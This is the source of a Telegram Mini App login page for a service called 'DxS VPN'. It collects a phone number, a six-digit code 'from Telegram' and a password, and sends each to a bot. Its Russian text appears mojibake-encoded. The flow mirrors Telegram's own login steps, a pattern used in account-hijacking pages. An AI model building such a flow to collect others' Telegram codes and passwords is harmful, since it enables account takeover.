<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>DxS VPN ‚Äî –í—Ö–æ–¥</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600&display=swap" rel="stylesheet">
  <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family: 'Google Sans', system-ui, sans-serif; background: linear-gradient(135deg, #f0f4ff 0%, #e6ecff 100%); color: #0f1a3a; height: 100vh; overflow: hidden; touch-action: manipulation; }
    .container { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 16px; }
    .lottie-container { width: 200px; height: 200px; margin-bottom: 24px; filter: drop-shadow(0 8px 24px rgba(26,115,232,0.24)); }
    h1 { font-size: 26px; font-weight: 600; text-align: center; margin-bottom: 28px; line-height: 1.3; }
    .input-group { width: 100%; max-width: 380px; margin-bottom: 16px; }
    .phone-row { display: flex; align-items: stretch; border: 2px solid #d2e0ff; border-radius: 14px; overflow: hidden; background: white; }
    .phone-row:focus-within { border-color: #4285f4; box-shadow: 0 0 0 3px rgba(66,133,244,0.12); }
    .country-select-wrapper { position: relative; flex: 0 0 92px; border-right: 1px solid #e0eaff; background: #f8fbff; }
    .country-select { appearance: none; border: none; padding: 0 32px 0 12px; font-size: 17px; background: transparent; cursor: pointer; height: 100%; width: 100%; text-align: center; }
    .flag { position: absolute; right: 8px; top: 50%; transform: translateY(-50%); font-size: 20px; pointer-events: none; }
    .number-input { flex: 1; border: none; padding: 14px 16px; font-size: 17px; outline: none; }
    input[type="tel"]::-webkit-outer-spin-button, input[type="tel"]::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
    input { padding: 14px 16px; font-size: 17px; border: none; outline: none; border-radius: 14px; }
    input:focus { outline: none; }
    .btn { width: 100%; max-width: 380px; padding: 16px; font-size: 18px; font-weight: 600; color: white; background: linear-gradient(145deg, #4285f4, #1967d2); border: none; border-radius: 14px; box-shadow: 0 8px 24px rgba(66,133,244,0.3); cursor: pointer; transition: all 0.24s; }
    .btn:hover { transform: translateY(-1px); box-shadow: 0 12px 32px rgba(66,133,244,0.4); }
    .btn:active { transform: scale(0.98); }
    .btn:disabled { opacity: 0.55; transform: none; box-shadow: none; cursor: not-allowed; }
    .link { margin-top: 20px; font-size: 15px; color: #4285f4; font-weight: 500; cursor: pointer; }
    .link:hover { text-decoration: underline; }
    .message { font-size: 15px; text-align: center; margin-top: 16px; line-height: 1.4; opacity: 0; transition: opacity 0.3s; white-space: pre-line; }
    .message.visible { opacity: 1; }
    .message.error { color: #d93025; }
    .message.success { color: #188038; }
    @media (min-width: 420px) { .lottie-container { width: 220px; height: 220px; margin-bottom: 32px; } h1 { font-size: 28px; } .country-select-wrapper { flex: 0 0 110px; } }
  </style>
</head>
<body>

<div class="container">
  <div class="lottie-container">
    <lottie-player src="./regorlog.json" background="transparent" speed="0.9" loop autoplay></lottie-player>
  </div>

  <h1>–í—Ö–æ–¥ –≤ DxS VPN</h1>

  <div class="input-group">
    <div class="phone-row">
      <div class="country-select-wrapper">
        <select class="country-select" id="countryCode">
          <option value="+7" data-flag="üá∑üá∫" selected>+7</option>
          <option value="+1" data-flag="üá∫üá∏">+1</option>
          <option value="+44" data-flag="üá¨üáß">+44</option>
          <option value="+49" data-flag="üá©üá™">+49</option>
          <option value="+33" data-flag="üá´üá∑">+33</option>
          <option value="+375" data-flag="üáßüáæ">+375</option>
        </select>
        <span class="flag" id="selectedFlag">üá∑üá∫</span>
      </div>
      <input type="tel" id="phoneNumber" class="number-input" placeholder="9991234567" inputmode="numeric" pattern="[0-9]*" autocomplete="tel-national" />
    </div>
  </div>

  <div class="input-group" id="codeGroup" style="display:none;">
    <input type="text" id="code" placeholder="–ö–æ–¥ –∏–∑ Telegram" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" />
  </div>

  <div class="input-group" id="passwordGroup" style="display:none;">
    <input type="password" id="password" placeholder="–ü–∞—Ä–æ–ª—å" autocomplete="current-password" />
  </div>

  <button class="btn" id="submitBtn">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>

  <div class="link" id="toRegister">–ï—â—ë –Ω–µ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞? –ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</div>

  <div class="message" id="statusMsg"></div>
</div>

<script>
  const countrySelect = document.getElementById('countryCode');
  const selectedFlag = document.getElementById('selectedFlag');
  const phoneNumber = document.getElementById('phoneNumber');
  const codeInput = document.getElementById('code');
  const passwordInput = document.getElementById('password');
  const codeGroup = document.getElementById('codeGroup');
  const passwordGroup = document.getElementById('passwordGroup');
  const submitBtn = document.getElementById('submitBtn');
  const toRegister = document.getElementById('toRegister');
  const statusMsg = document.getElementById('statusMsg');

  let step = 'phone';
  let fullPhone = '';

  countrySelect.addEventListener('change', () => {
    const opt = countrySelect.options[countrySelect.selectedIndex];
    selectedFlag.textContent = opt.dataset.flag || 'üåç';
  });

  phoneNumber.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));

  function showStatus(text, isError = false, isSuccess = false) {
    statusMsg.textContent = text;
    if (isError) statusMsg.style.color = '#d93025';
    else if (isSuccess) statusMsg.style.color = '#188038';
    else statusMsg.style.color = '#0f1a3a';
    statusMsg.classList.add('visible');
  }

  function hideStatus() {
    statusMsg.classList.remove('visible');
    statusMsg.textContent = '';
  }

  function triggerFeedback(style = 'light') {
    if (window.Telegram?.WebApp?.HapticFeedback) {
      try { window.Telegram.WebApp.HapticFeedback.impactOccurred(style); } catch {}
    }
  }

  function getFullPhone() {
    return countrySelect.value + phoneNumber.value.trim();
  }

  function handleBotResponse(event) {
    try {
      const data = JSON.parse(event.data);
      
      if (data.action === 'login_code_sent') {
        hideStatus();
        showStatus('–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram', false, true);
        codeGroup.style.display = 'block';
        phoneNumber.disabled = true;
        countrySelect.disabled = true;
        submitBtn.textContent = '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–¥';
        submitBtn.disabled = false;
        step = 'code';
        codeInput.focus();
      }
      
      else if (data.action === 'login_code_verified') {
        hideStatus();
        showStatus('–ö–æ–¥ –≤–µ—Ä–Ω—ã–π, –≤–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å', false, true);
        passwordGroup.style.display = 'block';
        codeInput.disabled = true;
        submitBtn.textContent = '–í–æ–π—Ç–∏';
        submitBtn.disabled = false;
        step = 'password';
        passwordInput.focus();
      }
      
      else if (data.action === 'login_success') {
        hideStatus();
        showStatus('–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω!', false, true);
        submitBtn.disabled = true;
        setTimeout(() => window.location.href = 'main.html', 1000);
      }
      
      else if (data.action === 'login_error') {
        submitBtn.disabled = false;
        showStatus(data.message || '–û—à–∏–±–∫–∞ –≤—Ö–æ–¥–∞', true);
      }
      
      else if (data.action === 'server_error') {
        submitBtn.disabled = false;
        showStatus('–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞. –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–∑–∂–µ', true);
      }
    } catch (e) {}
  }

  window.addEventListener('message', handleBotResponse);

  function handleSubmit() {
    const numPart = phoneNumber.value.trim();
    fullPhone = getFullPhone();

    if (step === 'phone') {
      if (numPart.length < 9) return showStatus('–ù–æ–º–µ—Ä —Å–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π', true);
      
      hideStatus();
      submitBtn.disabled = true;
      submitBtn.textContent = '–û—Ç–ø—Ä–∞–≤–∫–∞...';
      
      if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.sendData(JSON.stringify({
          action: 'request_login',
          phone: fullPhone
        }));
        triggerFeedback('heavy');
      }
    } 
    else if (step === 'code') {
      const code = codeInput.value.trim();
      if (code.length !== 6) return showStatus('–í–≤–µ–¥–∏—Ç–µ 6-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥', true);
      
      hideStatus();
      submitBtn.disabled = true;
      submitBtn.textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞...';
      
      if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.sendData(JSON.stringify({
          action: 'verify_code',
          phone: fullPhone,
          code: code
        }));
        triggerFeedback('medium');
      }
    }
    else if (step === 'password') {
      const password = passwordInput.value.trim();
      if (!password) return showStatus('–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å', true);
      
      hideStatus();
      submitBtn.disabled = true;
      submitBtn.textContent = '–í—Ö–æ–¥...';
      
      if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.sendData(JSON.stringify({
          action: 'submit_login',
          phone: fullPhone,
          password: password
        }));
        triggerFeedback('heavy');
      }
    }
  }

  submitBtn.addEventListener('click', handleSubmit);

  toRegister.addEventListener('click', () => {
    triggerFeedback('light');
    setTimeout(() => window.location.href = 'registration.html', 180);
  });

  if (window.Telegram?.WebApp) {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();
  }

  phoneNumber.focus();
</script>
</body>
</html>
